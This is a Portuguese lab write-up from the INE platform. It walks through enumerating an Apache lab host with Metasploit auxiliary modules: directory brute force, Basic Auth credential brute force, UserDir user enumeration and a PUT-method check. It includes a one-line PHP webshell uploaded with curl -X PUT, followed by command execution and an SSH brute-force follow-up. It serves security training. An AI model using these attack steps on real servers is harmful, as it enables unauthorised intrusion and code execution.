# 🧪 Lab Report — HTTP/Apache Enumeration com Metasploit

> **Plataforma:** INE
> **Tema central:** Enumeração completa de servidor Apache via módulos auxiliares do Metasploit — versão, headers, diretórios, arquivos, métodos HTTP perigosos e brute force de autenticação
> **Alvo:** `victim-1`

---

## 🎯 Objetivo

Mapear completamente um servidor Apache usando exclusivamente módulos auxiliares do Metasploit, identificando versão, estrutura de diretórios, arquivos sensíveis, métodos HTTP habilitados e credenciais válidas.

---

## 🧠 Por Que HTTP é uma Superfície de Ataque Tão Rica

Um servidor web expõe informações em múltiplas camadas:

| Camada | O Que Vaza | Ferramenta |
|--------|-----------|-----------|
| **Headers HTTP** | Versão do servidor, tecnologias, cookies | `http_header` |
| **Banner/Versão** | Software exato e versão | `http_version` |
| **robots.txt** | Diretórios que o admin não quer indexados | `robots_txt` |
| **Estrutura de diretórios** | Painéis, backups, APIs | `brute_dirs`, `dir_scanner` |
| **Arquivos sensíveis** | Configs, backups, credenciais | `files_dir` |
| **Métodos HTTP** | PUT/DELETE habilitados = escrita no servidor | `http_put` |
| **Autenticação Basic** | Credenciais fracas | `http_login` |
| **UserDir** | Usuários do sistema | `apache_userdir_enum` |

---

## 📋 Sumário de Módulos

| # | Módulo | Objetivo | Resultado Típico |
|---|--------|---------|-----------------|
| 1 | `http_version` | Versão do servidor | Apache 2.x.x (Ubuntu) |
| 2 | `robots_txt` | Diretórios bloqueados para bots | Paths ocultos |
| 3 | `http_header` | Headers da resposta HTTP | Tecnologias, cookies, segurança |
| 4 | `brute_dirs` | Diretórios via força bruta | Diretórios existentes |
| 5 | `dir_scanner` | Diretórios via wordlist | Paths válidos |
| 6 | `dir_listing` | Listagem de diretório aberta | Arquivos expostos |
| 7 | `files_dir` | Arquivos sensíveis conhecidos | Configs, backups |
| 8 | `http_put` | Testar método PUT/DELETE | Escrita no servidor |
| 9 | `http_login` | Brute force HTTP Basic Auth | Credenciais válidas |
| 10 | `apache_userdir_enum` | Usuários do sistema via mod_userdir | Usernames válidos |

---

## 🔬 Execução Passo a Passo

### Step 1 — Verificar Conectividade

```bash
ping -c 5 victim-1
```

**Por quê:** Confirmar que o alvo está acessível antes de carregar qualquer módulo. `-c 5` envia 5 pacotes — suficiente para confirmar estabilidade da conexão.

---

### Step 2 — Iniciar o Metasploit

```bash
msfconsole -q
```

**`-q`** = quiet — sem o banner ASCII. Mais rápido para chegar ao prompt.

---

### Módulo 1 — Versão do Servidor HTTP

```bash
use auxiliary/scanner/http/http_version
set RHOSTS victim-1
run
```

**O que faz:** Envia uma requisição HTTP e analisa o header `Server:` da resposta para identificar o software e versão exata.

**Por que começar pela versão:**
- Versão exata → busca direta de CVEs (`searchsploit Apache 2.4.49`)
- Revela se é Apache, nginx, IIS, lighttpd, etc.
- Pode revelar módulos ativos e sistema operacional

**Output típico:**
```
[+] victim-1:80 Apache/2.4.18 (Ubuntu)
```

> 💡 Apache 2.4.49 e 2.4.50 têm o **CVE-2021-41773** (Path Traversal + RCE). Versão exata importa.

---

### Módulo 2 — robots.txt

```bash
use auxiliary/scanner/http/robots_txt
set RHOSTS victim-1
run
```

**O que é robots.txt:** Arquivo de configuração que diz aos buscadores quais diretórios **não** indexar. Administradores frequentemente listam painéis administrativos, backups e diretórios sensíveis para manter fora do Google — e revelam exatamente o que querem esconder.

**Por que é valioso:**
```
# Exemplo de robots.txt revelador:
Disallow: /admin/
Disallow: /backup/
Disallow: /internal/
Disallow: /.git/
```

Cada entrada `Disallow` é um candidato direto a investigar.

**Output típico:**
```
[+] victim-1:80/robots.txt found
/cgi-bin/
/admin/
```

---

### Módulo 3 — Headers HTTP

```bash
# Diretório raiz
use auxiliary/scanner/http/http_header
set RHOSTS victim-1
run

# Diretório específico (com autenticação diferente)
set TARGETURI /secure
run
```

**O que são headers HTTP:** Metadados que acompanham cada resposta do servidor. Revelam muito sobre a infraestrutura.

**Headers relevantes em pentest:**

| Header | O Que Revela | Exemplo |
|--------|-------------|---------|
| `Server` | Software e versão | `Apache/2.4.18 (Ubuntu)` |
| `X-Powered-By` | Linguagem backend | `PHP/7.4.3` |
| `Set-Cookie` | Framework de sessão | `PHPSESSID=...` |
| `X-Frame-Options` | Proteção clickjacking | Ausente = vulnerável |
| `Content-Security-Policy` | Proteção XSS | Ausente = vulnerável |
| `WWW-Authenticate` | Tipo de auth | `Basic realm="Secure Area"` |
| `X-AspNet-Version` | Versão .NET | Revela stack Windows |

**Por que rodar em `/secure` separadamente:** Diretórios protegidos por autenticação podem retornar headers diferentes — incluindo `WWW-Authenticate` que confirma que há autenticação Basic naquele path.

---

### Módulo 4 — Força Bruta de Diretórios

```bash
use auxiliary/scanner/http/brute_dirs
set RHOSTS victim-1
run
```

**O que faz:** Tenta uma lista interna de diretórios comuns e verifica quais retornam código HTTP diferente de 404.

**Códigos HTTP relevantes:**

| Código | Significado | Ação |
|--------|-------------|------|
| `200` | Existe e acessível | Investigar conteúdo |
| `301/302` | Redirecionamento | Seguir o redirect |
| `403` | Existe mas acesso negado | Tentar bypass ou brute force de auth |
| `401` | Existe + requer autenticação | Brute force de credencial |
| `404` | Não existe | Ignorar |

> 💡 **403 é tão valioso quanto 200** — confirma que o diretório existe, só está protegido. É um alvo para técnicas de bypass de 403.

---

### Módulo 5 — Directory Scanner com Wordlist

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS victim-1
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

**Diferença em relação ao brute_dirs:** O `dir_scanner` usa uma wordlist customizável — você controla o que testar. Com wordlists maiores (SecLists, dirbuster), a cobertura é muito maior.

**Wordlists alternativas:**
```bash
# SecLists (mais completo)
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Dirbuster
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Dirb
/usr/share/wordlists/dirb/common.txt
```

---

### Módulo 6 — Directory Listing

```bash
use auxiliary/scanner/http/dir_listing
set RHOSTS victim-1
set PATH /data
run
```

**O que é directory listing:** Quando o servidor web está mal configurado e não tem `index.html` em um diretório, ele exibe a lista de arquivos como se fosse um explorador de arquivos. É uma misconfiguration que expõe todo o conteúdo do diretório.

**Por que `/data`:** Após descobrir o diretório com `dir_scanner`, este módulo verifica se a listagem está habilitada — ou seja, se você consegue ver todos os arquivos dentro sem saber os nomes.

**Output quando vulnerável:**
```
[+] victim-1 /data/ directory listing enabled
    backup.zip
    config.old
    passwords.txt
```

> ⚠️ Directory listing habilitado é uma das misconfigurations mais comuns e mais fáceis de explorar. Qualquer arquivo no diretório fica exposto.

---

### Módulo 7 — Busca de Arquivos Sensíveis

```bash
use auxiliary/scanner/http/files_dir
set RHOSTS victim-1
set VERBOSE false
run
```

**O que faz:** Testa uma lista extensa de nomes de arquivos conhecidos como sensíveis — backups, configs, logs, chaves — e verifica quais existem no servidor.

**Tipos de arquivos que o módulo procura:**

| Categoria | Exemplos |
|-----------|---------|
| Backups | `.bak`, `.old`, `.backup`, `~` |
| Configuração | `config.php`, `.env`, `web.config` |
| Banco de dados | `dump.sql`, `database.sql` |
| Credenciais | `passwords.txt`, `.htpasswd` |
| Código | `.git/HEAD`, `.svn/` |
| Logs | `error.log`, `access.log` |

**`set VERBOSE false`:** Sem essa flag, o módulo exibe cada arquivo testado — são centenas de linhas. Com `false`, só mostra os encontrados.

---

### Módulo 8 — Método HTTP PUT e DELETE

```bash
# Escrever arquivo no servidor
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run

# Verificar o arquivo criado
wget http://victim-1:80/data/test.txt
cat test.txt

# Deletar o arquivo
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run

# Confirmar deleção (deve retornar 404)
wget http://victim-1:80/data/test.txt
```

**O que é o método HTTP PUT:** HTTP tem vários métodos além de GET e POST:

| Método | Função Normal | Risco se Mal Configurado |
|--------|--------------|--------------------------|
| `GET` | Buscar recurso | — |
| `POST` | Enviar dados | — |
| `PUT` | **Criar/substituir arquivo** | Upload de webshell |
| `DELETE` | **Deletar arquivo** | Destruição de conteúdo |
| `OPTIONS` | Listar métodos aceitos | Revela capacidades |

**Por que PUT habilitado é crítico:**
```
PUT /data/shell.php com conteúdo PHP malicioso
        ↓
GET /data/shell.php?cmd=whoami
        ↓
Execução de código no servidor
```

É uma das formas mais diretas de obter RCE sem exploitar vulnerabilidade — só abusando de configuração permissiva.

**Como verificar manualmente os métodos aceitos:**
```bash
curl -v -X OPTIONS http://victim-1/
```

---

### Módulo 9 — Brute Force de HTTP Basic Auth

```bash
use auxiliary/scanner/http/http_login
set RHOSTS victim-1
set AUTH_URI /secure/
set VERBOSE false
run
```

**O que é HTTP Basic Auth:** Mecanismo de autenticação simples onde o browser envia `usuario:senha` codificados em Base64 no header `Authorization`. Fácil de implementar, fácil de atacar.

**Por que `AUTH_URI /secure/`:** O módulo precisa saber qual path exige autenticação para testar as credenciais no lugar certo. Sem isso, ele testaria no `/` que pode não estar protegido.

**Como o módulo funciona:**
```
Para cada par usuario:senha na wordlist:
    Envia GET /secure/ com header Authorization: Basic base64(user:pass)
    Se receber 200 → credencial válida
    Se receber 401 → credencial inválida
```

**Wordlists padrão usadas:**
```
/usr/share/metasploit-framework/data/wordlists/http_default_users.txt
/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt
```

**Output quando encontra credencial:**
```
[+] victim-1:80 - Success: 'admin:admin123'
```

---

### Módulo 10 — Apache UserDir Enumeration

```bash
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS victim-1
set VERBOSE false
run
```

**O que é mod_userdir:** Módulo Apache que permite cada usuário do sistema ter um diretório web pessoal acessível via `http://servidor/~usuario/`. Quando habilitado, você consegue descobrir quais usuários do sistema existem testando a URL.

**Como funciona a enumeração:**
```
GET /~john/     → 200 ou 403 → usuário 'john' existe no sistema
GET /~bob/      → 404        → usuário 'bob' não existe
GET /~admin/    → 200        → usuário 'admin' existe
```

**Por que isso é valioso além do web:**
- Usuários descobertos aqui → alvos para brute force SSH, FTP, SMB
- Usuário com diretório web pode ter arquivos acessíveis em `~usuario/`
- Revela a estrutura de usuários do sistema operacional

**Output típico:**
```
[+] Found user: admin
[+] Found user: john
[+] Found user: sarah
```

---

## 📊 Resultado Final — Mapa do Servidor

| Informação | Valor |
|-----------|-------|
| Servidor | Apache 2.4.x (Ubuntu) |
| Diretórios descobertos | `/admin/`, `/data/`, `/secure/`, `/cgi-bin/` |
| Directory listing | `/data/` habilitado |
| Método PUT | ✅ Habilitado em `/data/` |
| Autenticação Basic | `/secure/` — credencial obtida |
| Usuários do sistema | admin, john, sarah (via UserDir) |

---

## 🧠 Conceitos Consolidados

### Encadeamento de Módulos
Cada módulo alimenta o próximo:

```
http_version   → versão → CVEs específicos
robots_txt     → paths ocultos → alvos para dir_scanner
http_header    → /secure retorna 401 → alvo para http_login
dir_scanner    → descobre /data → alvo para dir_listing
dir_listing    → lista arquivos → alvos para wget/curl
http_put       → PUT habilitado → upload de webshell
http_login     → credencial → acesso ao /secure
userdir_enum   → usuários → alvos para SSH/FTP brute force
```

### Métodos HTTP Perigosos
```bash
# Ver métodos aceitos manualmente
curl -v -X OPTIONS http://IP/

# Se PUT estiver na lista → crítico
# Testar escrita
curl -X PUT http://IP/data/test.php -d "<?php system($_GET['cmd']); ?>"
curl "http://IP/data/test.php?cmd=id"
```

### HTTP Basic Auth — Base64 não é Criptografia
```bash
# Decodificar manualmente
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
# admin:password

# Sempre trafega em texto claro sem HTTPS
# Sniffing → credencial exposta
```

---

## 🔁 Próximos Passos Lógicos

```
Versão Apache identificada
        ↓
searchsploit Apache 2.4.x      ← CVEs da versão específica
        ↓
PUT habilitado em /data/
        ↓
curl -X PUT /data/shell.php com webshell PHP
curl /data/shell.php?cmd=id    ← RCE confirmado
        ↓
Usuários descobertos via UserDir
        ↓
use auxiliary/scanner/ssh/ssh_login
set USER_FILE usuarios_encontrados.txt  ← reutilizar lista
        ↓
Credencial /secure obtida
        ↓
Navegar /secure/ → dados protegidos
```

---

## 📌 Relacionados

- [[Web Fingerprinting]]
- [[Dirb]]
- [[Dirsearch]]
- [[Gobuster]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Metasploit — Banco de Dados e Workspaces]]
- [[Curl]]
- [[Cheatsheet — Portas Importantes]]

#lab #recon/ativo #ferramenta/metasploit #protocolo/http #exploração #apache
